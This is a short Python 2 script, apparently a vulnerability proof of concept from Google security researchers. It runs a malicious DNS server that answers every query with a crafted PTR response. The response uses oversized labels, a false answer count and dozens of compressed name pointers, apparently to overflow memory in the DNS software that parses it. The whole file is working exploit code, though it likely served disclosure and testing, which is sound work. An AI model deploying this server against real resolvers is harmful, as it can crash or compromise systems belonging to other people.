#!/usr/bin/python
#
# Copyright 2017 Google Inc
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# Authors:
#  Fermin J. Serna <fjserna@google.com>
#  Felix Wilhelm <fwilhelm@google.com>
#  Gabriel Campana <gbrl@google.com>
#  Kevin Hamacher <hamacher@google.com>
#  Gynvael Coldwind <gynvael@google.com>
#  Ron Bowes - Xoogler :/

import socket
import struct
import sys

def dw(x):
  return struct.pack('>H', x)

def udp_handler(sock_udp):

  data, addr = sock_udp.recvfrom(1024)
  print '[UDP] Total Data len recv ' + str(len(data))
  id = struct.unpack('>H', data[0:2])[0]
  query = data[12:]

  data = dw(id)                        # id
  data += dw(0x85a0)                   # flags
  data += dw(1)                        # questions
  data += dw(0x52)                     # answers
  data += dw(0)                        # authoritative
  data += dw(0)                        # additional

  # Add the question back - we're just hardcoding it
  data += ('\x03125\x018\x018\x018\x07in-addr\x04arpa\x00' +
           '\x00\x0c' + # type = 'PTR'
           '\x00\x01')   # cls = 'IN'

  # Add the first answer
  data += ('\xc0\x0c' + # ptr to the name
           '\x00\x0c' + # type = 'PTR'
           '\x00\x01' + # cls = 'IN'
           '\x00\x00\x00\x3d' + # ttl
           '\x04\x00' + # size of this resource record
           '\x3e' + 'Z'*62 +
           '\x3e' + 'Z'*62 +
           '\x3e' + 'Z'*62 +
           '\x3e' + 'Z'*62 +
           '\x3e' + 'Z'*62 +
           '\x3e' + 'Z'*62 +
           '\x3e' + 'Z'*62 +
           '\x3e' + 'Z'*62 +
           '\x3e' + 'Z'*62 +
           '\x3e' + 'Z'*62 +
           '\x3e' + 'Z'*62 +
           '\x3e' + 'Z'*62 +
           '\x3e' + 'Z'*62 +
           '\x3e' + 'Z'*62 +
           '\x3e' + 'Z'*62 +
           '\x3e' + 'Z'*62 +
           '\x0e' + 'Z'*14 +
           '\x00')

  # Add the next answer, which is written out in full
  data += ('\xc0\x0c' + # ptr to the name
           '\x00\x0c' + # type = 'PTR'
           '\x00\x01' + # cls = 'IN'
           '\x00\x00\x00\x3d' + # ttl
           '\x00\x26' + # size of this resource record
           '\x08DCBBEEEE\x04DDDD\x08CCCCCCCC\x04AAAA\x04BBBB\x03com\x00')

  for _ in range(79):
    data += ('\xc0\x0c' + # ptr to the name
             '\x00\x0c' + # type = 'PTR'
             '\x00\x01' + # cls = 'IN'
             '\x00\x00\x00\x3d' + # ttl
             '\x00\x02' + # size of the compressed resource record
             '\xc4\x40')   # pointer to the second record's name

  data += ('\xc0\x0c' + # ptr to the name
           '\x00\x0c' + # type = 'PTR'
           '\x00\x01' + # cls = 'IN'
           '\x00\x00\x00\x3d' + # ttl
           '\x00\x11' + # size of this resource record
           '\x04EEEE\x09DAABBEEEE\xc4\x49')

  sock_udp.sendto(data, addr)

if __name__ == '__main__':

  if len(sys.argv) != 3:
    print 'Usage: %s <ip> <port>\n' % sys.argv[0]
    sys.exit(0)

  ip = sys.argv[1]
  port = int(sys.argv[2])

  sock_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  sock_udp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  sock_udp.bind((ip, port))
  print 'Listening at %s:%d\n' % (ip, port)

  while True:
    udp_handler(sock_udp)

  sock_udp.close()

